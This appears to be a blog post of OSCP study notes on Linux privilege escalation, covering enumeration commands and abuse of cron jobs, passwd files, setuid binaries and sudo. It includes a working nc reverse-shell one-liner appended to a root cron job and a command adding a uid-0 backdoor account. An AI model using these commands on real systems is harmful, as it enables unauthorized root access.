---
author: "ZT"
title: Linux Privilege Escalation
description: "Common method of Linux Privilege Escalation"
image: LPE.png
date: 2023-10-10T21:49:28+02:00
categories:
    - Cybersecurity
    - StudyNotes
tags:
    - OSCP
    - PE
math: false
draft: false
---

## Introduction

**What is Privilege Escalation?** 

A **privilege escalation** is a cyberattack designed to gain unauthorized privileged access into a system. This not only make us able to access all resources on the system, but also closely related to lateral movement. We can dump other user's credential which saved in this system, so that we can use these credential to try to access other devices on the same intranet. Here I will show you same method to make a privilege escalation on the Linux Operating System.



## Manual Enumeration (Information Gathering)

- `id`
- `hostname`
- `env`: check environment variable
- `cat .bashrc`: check initialization script
- `history`: check previously executed commands
- `cat /etc/passwd`: show all users information
- `uname -a`: check system version and find if this version has kernel vulnerabilities
- `cat /etc/issue`: check system version
- `cat /etc/os-release`: check system version
- `ps aux`: list all process
- `find / -writable -type d 2>/dev/null`: find the folders that you are able to modify
- `find / -perm -u=s -type f 2>/dev/null`: find the executable file with setuid flag
- `find / -name *backup* -type f 2>/dev/null`
- `ls -lah /etc/cron*`: traverse scheduled tasks
- `ss -anp`: display active network connections and listening ports
- `lsmod`: enumerate the loaded kernel modules

## Automated Enumeration (Information Gathering)

- [linPEAS](https://github.com/carlospolop/PEASS-ng/releases)
- [unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check) [standard | detailed]

## Abusing Cron Jobs

1. Check cron job: `grep "CRON" /var/log/syslog`

2. Find the job which will run with the root permission

3. Check if this job's file is writable

4. Write payload to this file and wait: `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [local ip] [port] >/tmp/f" >> [target job file].sh`

## Abusing Password Authentication

1. Check passwd & shadow file permission, check if passwd file is writable or shadow file is readable

2. Linux password hash algorithm: sha-256, we can use openssl to generate it

3. Generate password hash command: `openssl passwd [passsword]`

4. If passwd file is writable, we can use `echo "root2:[password hash]:0:0:root:/root:/bin/bash" >> /etc/passwd` to overwrite the credential of root

## Abusing setuid Binaries and Capabilities

1. Find program which has setuid permission: `/usr/sbin/getcap -r / 2>/dev/null`

2. Go to [GTFOBins](https://gtfobins.github.io/) to find exploit. This website provides an organized list of UNIX binaries and how can they be misused to elevate our privileges

## Abusing Sudo

1. Run `sudo -l` to check our permission

2. Go to [GTFOBins](https://gtfobins.github.io/) to find exploit

## By the way

Privilege escalation is very flexible, and the methods I introduced are only the most common ones. In a real case, you need to do the information gathering carefully, and try to exploit human behaviors, design flaws or oversights in operating systems or web applications. I recommend carefully checking the output information of **linpeas**, which often contains vulnerabilities that you can use to escalate privileges.

